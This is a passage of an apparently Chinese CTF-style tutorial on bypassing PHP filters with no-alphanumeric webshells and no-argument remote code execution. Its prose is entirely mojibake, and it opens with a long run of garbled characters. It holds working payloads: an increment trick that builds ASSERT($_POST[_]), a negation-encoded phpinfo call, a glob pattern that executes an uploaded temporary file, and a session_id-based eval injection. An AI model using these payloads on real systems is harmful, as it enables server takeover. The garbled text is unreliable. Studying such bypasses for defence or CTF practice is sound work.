æ˜Ÿæ˜¨ç•è¶´èƒƒè´µç•Œè™¹è™¾èšæ€èš‚è™½å“å’½éª‚å“—å’±å“å“ˆå’¬å’³å“ªç‚­å³¡ç½šè´±è´´éª¨é’é’Ÿé’¢é’¥é’©å¸ç¼¸æ‹œçœ‹çŸ©æ€ç‰²é€‰é€‚ç§’é¦™ç§ç§‹ç§‘é‡å¤ç«¿æ®µä¾¿ä¿©è´·é¡ºä¿®ä¿ä¿ƒä¾®ä¿­ä¿—ä¿˜ä¿¡çš‡æ³‰é¬¼ä¾µè¿½ä¿Šç›¾å¾…å¾‹å¾ˆé¡»å™å‰‘é€ƒé£Ÿç›†èƒ†èƒœèƒèƒ–è„‰å‹‰ç‹­ç‹®ç‹¬ç‹¡ç‹±ç‹ è´¸æ€¨æ€¥é¥¶èš€é¥ºé¥¼å¼¯å°†å¥–å“€äº­äº®åº¦è¿¹åº­ç–®ç–¯ç–«ç–¤å§¿äº²éŸ³å¸æ–½é—»é˜€é˜å·®å…»ç¾å§œå›é€ç±»è¿·å‰é¦–é€†æ€»ç‚¼ç‚¸ç‚®çƒ‚å‰ƒæ´æ´ªæ´’æµ‡æµŠæ´æµ‹æ´—æ´»æ´¾æ´½æŸ“æµæ´‹æ´²æµ‘æµ“æ´¥æ’æ¢æ°æ¼æ¨ä¸¾è§‰å®£å®¤å®«å®ªçªç©¿çªƒå®¢å† è¯­æ‰è¢„ç¥–ç¥ç¥è¯¯è¯±è¯´è¯µå¦é€€æ—¢å±‹æ˜¼è´¹é™¡çœ‰å­©é™¤é™©é™¢å¨ƒå§¥å§¨å§»å¨‡æ€’æ¶è´ºç›ˆå‹‡æ€ æŸ”å’ç»‘ç»’ç»“ç»•éª„ç»˜ç»™ç»œéª†ç»ç»ç»Ÿè€•è€—è‰³æ³°ç ç­ç´ èš•é¡½ç›åŒªææ ½æ•æŒ¯è½½èµ¶èµ·ç›ææåŸ‹æ‰æ†ææŸéƒ½å“²é€æ¡æ¢æŒ½çƒ­æå£¶æŒ¨è€»è€½æ­è²è«è·è·æ™‹æ¶çœŸæ¡†æ¡‚æ¡£æ¡æ ªæ¡¥æ¡ƒæ ¼æ ¡æ ¸æ ·æ ¹ç´¢å“¥é€Ÿé€—æ —é…ç¿…è¾±å”‡å¤ç¡€ç ´åŸå¥—é€çƒˆæ®Šé¡¾è½¿è¾ƒé¡¿æ¯™è‡´æŸ´æ¡Œè™‘ç›‘ç´§å…šæ™’çœ æ™“é¸­æ™ƒæ™Œæ™•èšŠå“¨å“­æ©å”¤å•Šå”‰ç½¢å³°åœ†è´¼è´¿é’±é’³é’»é“é“ƒé“…ç¼ºæ°§ç‰¹ç‰ºé€ ä¹˜æ•Œç§¤ç§Ÿç§¯ç§§ç§©ç§°ç§˜é€ç¬”ç¬‘ç¬‹å€ºå€Ÿå€¼å€šå€¾å€’å€˜ä¿±å€¡å€™ä¿¯å€å€¦å¥è‡­å°„èº¬æ¯å¾’å¾èˆ°èˆ±èˆ¬èˆªé€”æ‹¿çˆ¹çˆ±é¢‚ç¿è„†è„‚èƒ¸èƒ³è„èƒ¶è„‘ç‹¸ç‹¼é€¢ç•™çš±é¥¿æ‹æ¡¨æµ†è¡°é«˜å¸­å‡†åº§è„Šç—‡ç—…ç–¾ç–¼ç–²æ•ˆç¦»å”èµ„å‡‰ç«™å‰–ç«éƒ¨æ—æ—…ç•œé˜…ç¾ç“¶æ‹³ç²‰æ–™ç›Šå…¼çƒ¤çƒ˜çƒ¦çƒ§çƒ›çƒŸé€’æ¶›æµ™æ¶é…’æ¶‰æ¶ˆæµ©æµ·æ¶‚æµ´æµ®æµæ¶¦æµªæµ¸æ¶¨çƒ«æ¶Œæ‚Ÿæ‚„æ‚”æ‚¦å®³å®½å®¶å®µå®´å®¾çª„å®¹å®°æ¡ˆè¯·æœ—è¯¸è¯»æ‰‡è¢œè¢–è¢è¢«ç¥¥è¯¾è°è°ƒå†¤è°…è°ˆè°Šå‰¥æ³å±•å‰§å±‘å¼±é™µé™¶é™·é™ªå¨±å¨˜é€šèƒ½éš¾é¢„æ¡‘ç»¢ç»£éªŒç»§çƒç†æ§å µæåŸŸæ©æ·æ’æ‰å †æ¨æ€æˆæ•™ææ åŸ¹æ¥æ§æ¢æ®æ˜èŒåŸºè‘—å‹’é»„èŒèèŒèœè„èŠèè è¥æ¢°æ¢¦æ¢¢æ¢…æ£€æ¢³æ¢¯æ¡¶æ•‘å‰¯ç¥¨æˆšçˆ½è‹è¢­ç››é›ªè¾…è¾†è™šé›€å ‚å¸¸åŒ™æ™¨ççœ¯çœ¼æ‚¬é‡å•¦æ™šå•„è·è·ƒç•¥è›‡ç´¯å”±æ‚£å”¯å´–å´­å´‡åœˆé“œé“²é“¶ç”œæ¢¨çŠç§»ç¬¨ç¬¼ç¬›ç¬¦ç¬¬æ•åšè¢‹æ‚ å¿å¶å·æ‚¨å”®åœåå‡å¾—è¡”ç›˜èˆ¹æ–œç›’é¸½æ‚‰æ¬²å½©é¢†è„šè„–è„¸è„±è±¡å¤ŸçŒœçŒªçŒçŒ«çŒ›é¦…é¦†å‡‘å‡æ¯«éº»ç—’ç—•å»Šåº·åº¸é¹¿ç›—ç« ç«Ÿå•†æ—æ—‹æœ›ç‡ç€ç›–ç²˜ç²—ç²’æ–­å‰ªå…½æ¸…æ·»æ·‹æ·¹æ¸ æ¸æ··æ¸”æ·˜æ¶²æ·¡æ·±å©†æ¢æ¸—æƒ…æƒœæƒ­æ‚¼æƒ§æƒ•æƒŠæƒ¨æƒ¯å¯‡å¯„å®¿çª‘å¯†è°‹è°ç¥¸è°œé€®æ•¢å± å¼¹éšè›‹éš†éšå©šå©¶é¢ˆç»©ç»ªç»­éª‘ç»³ç»´ç»µç»¸ç»¿ç´æ–‘æ›¿æ¬¾å ªæ­å¡”è¶Šè¶è¶‹è¶…æå ¤åšæ­å–œæ’æªæœç…®æ´è£ææ‚æ…æ¡æ‰æ–¯æœŸæ¬ºè”æ•£æƒ¹è‘¬è‘›è‘£è‘¡æ•¬è‘±è½æœè¾œè‘µæ£’æ£‹æ¤æ£®æ¤…æ¤’æ£µæ£æ£‰æ£šæ£•æƒ æƒ‘é€¼å¨å¦ç¡¬ç¡®é›æ®–è£‚é›„æš‚é›…è¾ˆæ‚²ç´«è¾‰æ•èµæŒæ™´æš‘æœ€é‡å–·æ™¶å–‡é‡å–Šæ™¯è·µè·Œè·‘é—è›™è››èœ“å–å–‚å–˜å–‰å¹…å¸½èµŒèµ”é»‘é“¸é“ºé“¾é”€é”é”„é”…é”ˆé”‹é”çŸ­æ™ºæ¯¯é¹…å‰©ç¨ç¨‹ç¨€ç¨ç­ç­‰ç­‘ç­–ç­›ç­’ç­”ç­‹ç­å‚²å‚…ç‰Œå ¡é›†ç„¦å‚å‚¨å¥¥è¡—æƒ©å¾¡å¾ªè‰‡èˆ’ç•ªé‡Šç¦½è…Šè„¾è…”é²çŒ¾çŒ´ç„¶é¦‹è£…è›®å°±ç—›ç«¥é˜”å–„ç¾¡æ™®ç²ªå°Šé“æ›¾ç„°æ¸¯æ¹–æ¸£æ¹¿æ¸©æ¸´æ»‘æ¹¾æ¸¡æ¸¸æ»‹æº‰æ„¤æ…Œæƒ°æ„§æ„‰æ…¨å‰²å¯’å¯Œçªœçªçª—éè£•è£¤è£™è°¢è°£è°¦å±å±¡å¼ºç²¥ç–éš”éš™çµ®å«‚ç™»ç¼ç¼“ç¼–éª—ç¼˜ç‘é­‚è‚†æ‘„æ‘¸å¡«æå¡Œé¼“æ‘†æºæ¬æ‘‡æå¡˜æ‘Šè’œå‹¤é¹Šè“å¢“å¹•è“¬è“„è’™è’¸çŒ®ç¦æ¥šæƒ³æ§æ¦†æ¥¼æ¦‚èµ–é…¬æ„Ÿç¢ç¢‘ç¢ç¢°ç¢—ç¢Œé›·é›¶é›¾é›¹è¾“ç£é¾„é‰´ç›ç¡ç¬é„™æ„šæš–ç›Ÿæ­‡æš—ç…§è·¨è·³è·ªè·¯è·Ÿé£è›¾èœ‚å—“ç½®ç½ªç½©é”™é”¡é”£é”¤é”¦é”®é”¯çŸ®è¾ç¨ æ„ç­¹ç­¾ç®€æ¯èˆ…é¼ å‚¬å‚»åƒèº²å¾®æ„ˆé¥è…°è…¥è…¹è…¾è…¿è§¦è§£é…±ç—°å»‰æ–°éŸµæ„ç²®æ•°ç…å¡‘æ…ˆç…¤ç…Œæ»¡æ¼ æºæ»¤æ»¥æ»”æºªæºœæ»šæ»¨ç²±æ»©æ…èª‰å¡è°¨ç¦ç¾¤æ®¿è¾Ÿéšœå«Œå«å ç¼ç¼ é™ç¢§ç’ƒå¢™æ’‡å˜‰æ‘§æˆªèª“å¢ƒæ‘˜æ‘”èšè”½æ…•æš®è”‘æ¨¡æ¦´æ¦œæ¦¨æ­Œé­é…·é…¿é…¸ç£æ„¿éœ€å¼Šè£³é¢—å—½èœ»èœ¡è‡èœ˜èµšé”¹é”»èˆç¨³ç®—ç®©ç®¡åƒšé¼»é­„è²Œè†œè†Šè†€é²œç–‘é¦’è£¹æ•²è±ªè†é®è…ç˜¦è¾£ç«­ç«¯æ——ç²¾æ­‰ç†„ç†”æ¼†æ¼‚æ¼«æ»´æ¼”æ¼æ…¢å¯¨èµ›å¯Ÿèœœè°±å«©ç¿ ç†Šå‡³éª¡ç¼©æ…§æ’•æ’’è¶£è¶Ÿæ’‘æ’­æ’æ’¤å¢èªé‹è•‰è”¬æ¨ªæ§½æ¨±æ©¡é£˜é†‹é†‰éœ‡éœ‰ç’é¢˜æš´çå½±è¸¢è¸è¸©è¸ªè¶è´å˜±å¢¨é•‡é ç¨»é»ç¨¿ç¨¼ç®±ç®­ç¯‡åƒµèººåƒ»å¾·è‰˜è†è†›ç†Ÿæ‘©é¢œæ¯…ç³Šéµæ½œæ½®æ‡‚é¢æ…°åŠˆæ“ç‡•è–¯è–ªè–„é¢ æ©˜æ•´èé†’é¤å˜´è¹„å™¨èµ é»˜é•œèµç¯®é‚€è¡¡è†¨é›•ç£¨å‡è¾¨è¾©ç³–ç³•ç‡ƒæ¾¡æ¿€æ‡’å£é¿ç¼´æˆ´æ“¦é è—éœœéœç§è¹ˆèºç©—ç¹è¾«èµ¢ç³Ÿç³ ç‡¥è‡‚ç¿¼éª¤é­è¦†è¹¦é•°ç¿»é¹°è­¦æ”€è¹²é¢¤ç“£çˆ†ç–†å£¤è€€èºåš¼åš·ç±é­”çŒè ¢éœ¸éœ²å›Šç½åŒ•åˆä¸æ­¹æˆˆå¤­ä»‘è®¥å†—é‚“è‰¾å¤¯å‡¸å¢å­å½çš¿å‡¹å›šçŸ¢ä¹å°”å†¯ç„é‚¦è¿‚é‚¢èŠ‹èŠåå¤·åå•å†å±¹å»·è¿„è‡¼ä»²ä¼¦ä¼Šè‚‹æ—­åŒˆå‡«å¦†äº¥æ±›è®³è®¶è®¹è®¼è¯€å¼›é˜±é©®é©¯çº«ç–ç›éŸ§æŠ æ‰¼æ±æ‰³æŠ¡ååæŠ‘æ‹ŸæŠ’èŠ™èŠœè‹‡èŠ¥èŠ¯èŠ­æ–æ‰å·«æˆç”«åŒ£è½©å¤è‚–å±å å‘•å‘åŸå‘›å»å­é‚‘å›¤å®å²–ç‰¡ä½‘ä½ƒä¼ºå›±è‚›è‚˜ç”¸ç‹ˆé¸ å½¤ç¸åˆ¨åº‡ååºé—°å…‘ç¼æ²æ²›æ±°æ²¥æ²¦æ±¹æ²§æ²ªå¿±è¯…è¯ˆç½•å±å å¦“å§Šå¦’çº¬ç«å¦å·å¯æ‹“åªå¤æ‹„æ‹§æ‹‚æ‹™æ‹‡æ‹—èŒ‰æ˜”è‹›è‹«è‹Ÿè‹èŒè‹”æ‰æ¢æšæ«æ­éƒçŸ¾å¥ˆå¥„æ®´æ­§å“æ˜™å“å’•å‘µå’™å‘»å•°å’’å’†å’–å¸•è´¦è´¬è´®æ°›ç§‰å²³ä¾ ä¾¥ä¾£ä¾ˆå‘åˆ½åˆ¹è‚´è§…å¿¿ç“®è‚®è‚ªç‹åºç–Ÿç–™ç–šå’æ°“ç‚¬æ²½æ²®æ³£æ³æ³Œæ²¼æ€”æ€¯å® å®›è¡©ç¥ˆè¯¡å¸šå±‰å¼§å¼¥é™‹é™Œå‡½å§†è™±åç»…é©¹ç»Šç»å¥‘è´°ç·ç²çŠæ‹­æ‹·æ‹±æŒŸå¢å›æ‹¯è†èŒ¸èŒ¬èšèŒµèŒ´èè è¤è§è”æ ˆæŸ‘æ …æŸ æ·å‹ƒæŸ¬ç ‚æ³µç šé¸¥è½´éŸ­è™æ˜§ç›¹å’§æ˜µæ˜­ç›…å‹‹å“†å’ªå“Ÿå¹½é’™é’é’ é’¦é’§é’®æ¯¡æ°¢ç§•ä¿ä¿„ä¿ä¾¯å¾Šè¡èƒšèƒ§èƒç‹°é¥µå³¦å¥•å’¨é£’é—ºé—½ç±½å¨„çƒç‚«æ´¼æŸ’æ¶æ´›æƒææ¬æ¤å®¦è¯«è¯¬ç¥ è¯²å±å±é€Šé™¨å§šå¨œèš¤éª‡è€˜è€™ç§¦åŒ¿åŸ‚æ‚æè¢æŒæŒ«æŒšæ£æ…åŸƒè€¿è‚è¸è½è±è‰è¹èºæ¢†æ –æ¡¦æ “æ¡…æ¡©è´¾é…Œç ¸ç °ç ¾æ®‰é€å“®å” å“ºå‰”èšŒèšœç•”èš£èšªèš“å“©åœƒé¸¯å”å“¼å”†å³­å”§å³»èµ‚èµƒé’¾é“†æ°¨ç§«ç¬†ä¿ºèµå€”æ®·è€¸èˆ€è±ºè±¹é¢èƒ¯èƒ°è„è„“é€›å¿é¸µé¸³é¦å‡Œå‡„è¡·éƒ­æ–‹ç–¹ç´Šç“·ç¾”çƒ™æµ¦æ¶¡æ¶£æ¶¤æ¶§æ¶•æ¶©æ‚æ‚¯çªè¯ºè¯½è¢’è°†ç¥Ÿæ•å¨©éªçéº¸ç‰ç…æªæºæ¶èµ¦åŸ æ»ææ‚æ–æ·æ¸æºå‹˜èŠå¨¶è±è²èè©è¤ä¹¾è§è¨è‡å½¬æ¢—æ¢§æ¢­æ›¹é…é…—å¢ç¡…ç¡•å¥¢ç›”åŒ¾é¢…å½ªçœ¶æ™¤æ›¼æ™¦å†•å•¡ç•¦è¶¾å•ƒè›†èš¯è›‰è›€å”¬å”¾å•¤å•¥å•¸å´é€»å´”å´©å©´èµŠé“é“›é“é“¡é“£é“­çŸ«ç§¸ç§½ç¬™ç¬¤åå‚€èº¯å…œè¡…å¾˜å¾™èˆ¶èˆ·èˆµæ•›ç¿è„¯é€¸å‡°çŒ–ç¥­çƒ¹åº¶åºµç—Šé˜é˜çœ·ç„Šç„•é¸¿æ¶¯æ·‘æ·Œæ·®æ·†æ¸Šæ·«æ·³æ·¤æ·€æ¶®æ¶µæƒ¦æ‚´æƒ‹å¯‚çª’è°è°è£†è¢±ç¥·è°’è°“è°šå°‰å •éš…å©‰é¢‡ç»°ç»·ç»¼ç»½ç¼€å·¢ç³ç¢ç¼æå °æ©æ½æ–å½­æ£æ€æ“å£¹æ”è‘«å‹Ÿè’‹è’‚éŸ©æ£±æ¤°ç„šæ¤æ£ºæ¦”æ¤­ç²Ÿæ£˜é…£é…¥ç¡ç¡«é¢Šé›³ç¿˜å‡¿æ£ æ™°é¼å–³éæ™¾ç•´è·‹è·›è›”èœ’è›¤é¹ƒå–»å•¼å–§åµŒèµ‹èµèµé”‰é”Œç”¥æ°æ°®æ°¯é»ç­ç‰ç²¤é€¾è…Œè…‹è…•çŒ©çŒ¬æƒ«æ•¦ç—˜ç—¢ç—ªç«£ç¿”å¥ é‚ç„™æ»æ¹˜æ¸¤æ¸ºæºƒæº…æ¹ƒæ„•æƒ¶å¯“çª–çª˜é›‡è°¤çŠ€éš˜åª’åªšå©¿ç¼…ç¼†ç¼”ç¼•éªšç‘Ÿé¹‰ç‘°æªè˜æ–Ÿé´é¶è“–è’¿è’²è“‰æ¥”æ¤¿æ¥·æ¦„æ¥æ¥£é…ªç¢˜ç¡¼ç¢‰è¾è¾‘é¢‘ç¹ç¦ç„å—œå—¦æš‡ç•¸è··è·ºèœˆèœ—èœ•è›¹å—…å—¡å—¤ç½²èœ€å¹Œé”šé”¥é”¨é”­é”°ç¨šé¢“ç­·é­è¡™è…»è…®è…ºé¹è‚„çŒ¿é¢–ç…é›é¦é¦ç¦€ç—¹å»“ç—´é–èªŠæ¼“æº¢æº¯æº¶æ»“æººå¯çª¥çªŸå¯è¤‚è£¸è°¬åª³å«‰ç¼šç¼¤å‰¿èµ˜ç†¬èµ«è”«æ‘¹è”“è”—è”¼ç†™è”šå…¢æ¦›æ¦•é…µç¢Ÿç¢´ç¢±ç¢³è¾•è¾–é›Œå¢…å˜è¸Šè‰å˜€å¹”é•€èˆ”ç†ç®ç®•ç®«èˆ†åƒ§å­µç˜©ç˜Ÿå½°ç²¹æ¼±æ¼©æ¼¾æ…·å¯¡å¯¥è°­è¤è¤ªéš§å«¡ç¼¨æ’µæ’©æ’®æ’¬æ“’å¢©æ’°éè•Šè•´æ¨Šæ¨Ÿæ©„æ•·è±Œé†‡ç£•ç£…ç¢¾æ†‹å˜¶å˜²å˜¹è èèŒè—è™å˜¿å¹¢é•Šé•ç¨½ç¯“è†˜é²¤é²«è¤’ç˜ªç˜¤ç˜«å‡›æ¾æ½­æ½¦æ¾³æ½˜æ¾ˆæ¾œæ¾„æ†”æ‡Šæ†ç¿©è¤¥è°´é¹¤æ†¨å±¥å¬‰è±«ç¼­æ’¼æ“‚æ“…è•¾è–›è–‡æ“ç¿°å™©æ©±æ©™ç“¢èŸ¥éœéœè¾™å†€è¸±è¹‚èŸ†èƒèŸå™ªé¹¦é»”ç©†ç¯¡ç¯·ç¯™ç¯±å„’è†³é²¸ç˜¾ç˜¸ç³™ç‡æ¿’æ†¾æ‡ˆçª¿ç¼°å£•è—æª¬æªæª©æª€ç¤ç£·äº†ç¬ç³çªæ›™è¹‹èŸ‹èŸ€åšèµ¡é•£é­ç°‡å„¡å¾½çˆµæœ¦è‡Šé³„ç³œç™Œæ‡¦è±è‡€è—•è—¤ç»åš£é³ç™ç€‘è¥Ÿç’§æˆ³æ”’å­½è˜‘è—»é³–è¹­è¹¬ç°¸ç°¿èŸ¹é¡ç™£ç¾¹é¬“æ”˜è •å·é³ç³¯è­¬éœ¹èºé«“è˜¸é•¶ç“¤çŸ—&quot;;function mb_str_split( $string ) &#123; return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string );&#125;foreach (mb_str_split($word) as $c)&#123; $arr[] = $c;&#125;for ($x=0;$x&lt;strlen($shell);$x++)&#123; for ($y=0;$y&lt;count($arr);$y++) &#123; $k = $arr[$y]; if ($shell[$x] == ~($k&#123;1&#125;)) &#123; $result .= $k; break; &#125; &#125;&#125;echo $result;?&gt; æ–¹æ³•ä¸‰è¿™ä¸ªæ–¹æ³•è¿ç”¨åˆ°äº†phpé€’å¢çš„é€’å¢è¿ç®—ï¼Œè€Œphpçš„è‡ªå¢è¿ç®—å’Œcæ˜¯ä¸ä¸€æ ·çš„ï¼šé€’å¢ï¼é€’å‡è¿ç®—ç¬¦ æ¯”å¦‚ï¼š 1234567$a=&#x27;a&#x27;;&amp;z=&#x27;z&#x27;;echo ++$a;echo ++$z;//b//aa æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸ºaï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—a-zä¸­æ‰€æœ‰å­—ç¬¦ã€‚é‚£ä¹ˆæ€ä¹ˆè·å–åˆ°å­—ç¬¦aå‘¢ï¼Ÿæˆ‘ä»¬å‘ç°æ•°ç»„ï¼ˆArrayï¼‰çš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™Aï¼Œè€Œä¸”ç¬¬4ä¸ªå­—æ¯æ˜¯å°å†™aã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶æ‹¿åˆ°å°å†™å’Œå¤§å†™Aï¼Œç­‰äºæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°a-zå’ŒA-Zçš„æ‰€æœ‰å­—æ¯ã€‚ åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸ºArrayï¼š 123echo &#x27;&#x27;.[]//Array è€Œç”±äºphpå¤§å°å†™ä¸æ•æ„Ÿï¼Œå› æ­¤å–ç¬¬ä¸€ä¸ªå¤§å†™Aå°±å¯ä»¥äº†ï¼Œpayloadï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); ps.assertä¸é€‚ç”¨äºé«˜ç‰ˆæœ¬phpï¼Œé«˜ç‰ˆæœ¬phpå¯ä»¥ä½¿ç”¨file_put_contentsç­‰å…¶ä»–å‡½æ•°æ›¿ä»£ æ–¹æ³•å››å¦‚æœ$æˆ–è€…é•¿åº¦é­åˆ°é™åˆ¶ï¼Œä¸Šé¢çš„æ–¹æ³•å°±å¤±æ•ˆäº†ï¼Œä¸è¿‡åœ¨php7ä¸­æ”¯æŒä½¿ç”¨($a)();è¿™ç§æ–¹æ³•æ¥è°ƒç”¨å‘½ä»¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨å–åæ¥æ„å»ºpayloadï¼š 12(~%8F%97%8F%96%91%99%90)();//phpinfo(); æ–¹æ³•äº”ä½†æ˜¯åœ¨php7ä»¥å‰éƒ½ä¸æ”¯æŒè¿™ç§è¡¨è¾¾ï¼Œè¿™æ—¶æˆ‘ä»¬è¦åº”ç”¨linux shellä¸‹çš„ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š shellä¸‹å¯ä»¥ä½¿ç”¨.æ¥æ‰§è¡Œä»»æ„è„šæœ¬æ–‡ä»¶ linuxæ–‡ä»¶åæ”¯æŒglobé€šé…ç¬¦æ›¿ä»£ æ¯”å¦‚æˆ‘ä»¬å°†echo &quot;ls&quot;å†™å…¥mrl64ä¸­ï¼Œç„¶åæ‰§è¡Œ.mrl64ï¼Œæˆ‘ä»¬å‘ç°lsè¢«æ‰§è¡ŒæˆåŠŸäº†ã€‚ è€Œé€šé…ç¬¦éƒ½æœ‰å“ªäº›å‘¢ï¼š 1234567*å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„æ–‡ä»¶?å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦[^a]å¯ä»¥ç”¨æ¥åˆ¤æ–­è¿™ä¸ªä½ç½®çš„å­—ç¬¦æ˜¯ä¸æ˜¯a[0-9]å¯ä»¥ç”¨æ¥é™åˆ¶èŒƒå›´ æˆ‘ä»¬å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…æ—¶ï¼Œæ–‡ä»¶ä¼šè¢«ä¿å­˜åœ¨è¿™ä¸ª/tmp/phpXXXXXXä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼ŒXXXXXXæ˜¯å…­ä½éšæœºå¤§å°å†™å­—æ¯ï¼Œç”±äºå¹²æ‰°æˆ‘ä»¬çš„æ–‡ä»¶å…¨éƒ¨éƒ½æ˜¯å°å†™çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡é™åˆ¶å¤§å†™æ¥æ‰§è¡Œæ–‡ä»¶ã€‚ç”±äºå¤§å†™å­—æ¯çš„å‰åæ˜¯@ä¸[ï¼Œå› æ­¤payloadï¼š 1`.+/???/????????[@-[]` å› æ­¤è¿™æ ·å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥å†™å…¥ä¸€å¥é©¬ç­‰ç­‰ã€‚ æ–¹æ³•å…­è¿™ä¸ªæ–¹æ³•ä½¿ç”¨åœ¨pythonä¸Šçš„ï¼Œå› ä¸ºæ²¡æœ‰å­¦ä¹ è¿‡pythonjailç›¸å…³çš„çŸ¥è¯†ï¼Œå› æ­¤å°±ä¸åšè¯¦ç»†åˆ†æäº†ï¼ŒæŠŠæ–‡ç« æ”¾å‡ºæ¥ä½œä¸ºå‚è€ƒï¼šä¸€é“æœ‰è¶£çš„pyjailé¢˜ç›®åˆ†æ å…³äºæ— å­—ç¬¦webshellï¼Œå¯ä»¥ä»”ç»†ç ”ç©¶ä¸‹pç‰›çš„ä¸¤ç¯‡æ–‡ç« ï¼šä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshellæ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ æ— å‚æ•°rceæ— å­—ç¬¦webshellè¿‡æ»¤çš„æ˜¯å­—æ¯åŠæ•°å­—ï¼Œæˆ–è®¸è¿˜æœ‰äº›ç‰¹æ®Šç¬¦å·ï¼Œè€Œæ— å‚æ•°rceä¸­è¿‡æ»¤çš„å¾€å¾€éƒ½æ˜¯ç¬¦å·ï¼Œå› æ­¤è¿™ç±»payloadçš„æ„é€ å¾€å¾€å’Œå‡½æ•°çš„åº”ç”¨æœ‰å…³ã€‚ æ–¹æ³•ä¸€phpä¸­çš„session_id()å¯ä»¥è¯»å–cookieä¸­çš„PHPSESSIDå€¼ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨éœ€è¦æˆ‘ä»¬å¼€å¯sessionï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°session_start()ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ„é€ payloadï¼š 1234567eval($_GET(&#x27;a&#x27;));?a=eval(hex2bin(session_id(session_start())))Cookie: PHPSESSID=706870696e666f28293b//phpinfo(); æ–¹æ³•äºŒè¿™ä¸ªæ–¹æ³•è¿ç”¨åˆ°äº†get_defined_vars()ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œæˆ‘ä»¬é€šè¿‡GETä¸POSTæ–¹æ³•ä¼ å…¥çš„å˜é‡éƒ½å¯ä»¥è¢«è¯»å–å‡ºæ¥ã€‚è€Œç”±äºè¿™ä¸ªå‡½æ•°æœ¬èº«è¿”å›çš„æ˜¯ä¸ªäºŒç»´æ•°ç»„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å–æ•°ç»„çš„å‡½æ•°æ¥å–å€¼ã€‚ ä¸€äº›è¯»å–æ•°ç»„çš„å‡½æ•°ï¼š 123456end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚current() - è¿”å›å½“å‰è¢«å†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„æ•°ç»„å•å…ƒçš„å€¼ï¼Œå¹¶ä¸ç§»åŠ¨æŒ‡é’ˆã€‚ å› 